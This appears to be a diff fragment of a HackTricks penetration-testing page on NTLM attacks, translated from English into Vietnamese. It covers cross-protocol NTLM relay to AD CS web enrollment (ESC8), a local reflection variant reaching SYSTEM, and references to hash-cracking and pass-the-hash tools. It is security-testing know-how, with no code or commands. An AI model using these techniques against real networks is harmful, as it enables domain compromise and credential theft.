-A serialized target-information DNS name can also steer coerced authentication toward an attacker for a **cross-protocol relay** to an AD CS web-enrollment endpoint. This is a separate outcome from same-host reflection: the [ESC8 enrollment conditions](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), DNS-write rights, a coercion path, and the target's patch level must be assessed independently.
+Tên DNS chứa thông tin đích được tuần tự hóa cũng có thể hướng xác thực bị ép đến kẻ tấn công để thực hiện **cross-protocol relay** đến endpoint web enrollment của AD CS. Đây là kết quả riêng biệt với reflection trên cùng máy chủ: cần đánh giá độc lập các điều kiện enrollment của [ESC8](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), quyền ghi DNS, đường ép xác thực và mức bản vá của đích.
 
-For the **March 2026** local reflection variant that abuses **SMB arbitrary ports** and **TCP connection reuse** to reach `NT AUTHORITY\SYSTEM`, see:
+Để xem biến thể reflection cục bộ **tháng 3 năm 2026**, khai thác **SMB arbitrary ports** và **TCP connection reuse** để đạt `NT AUTHORITY\SYSTEM`, xem:
 
 {{#ref}}
 ../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
 {{#endref}}
 
 ## References
-- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
-- [2] [Hashcat example hashes – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
-- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
-- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
-- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
+- [1] [evilmog/ntlmv1-multi – Công cụ đa năng NTLMv1](https://github.com/evilmog/ntlmv1-multi)
+- [2] [Hash mẫu của Hashcat – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
+- [3] [Kevin-Robertson/Invoke-TheHash – Tiện ích Pass The Hash cho PowerShell](https://github.com/Kevin-Robertson/Invoke-TheHash)
+- [4] [Tấn công Internal Monologue: lấy NTLM Hash mà không truy cập LSASS](https://github.com/eladshamir/Internal-Monologue)
+- [5] [NTLM Reflection đã chết, NTLM Reflection muôn năm!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
 - [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
-- [7] [Cracking an NTLMv2 Hash – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
-
+- [7] [Crack NTLMv2 Hash – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
 {{#include ../../banners/hacktricks-training.md}}
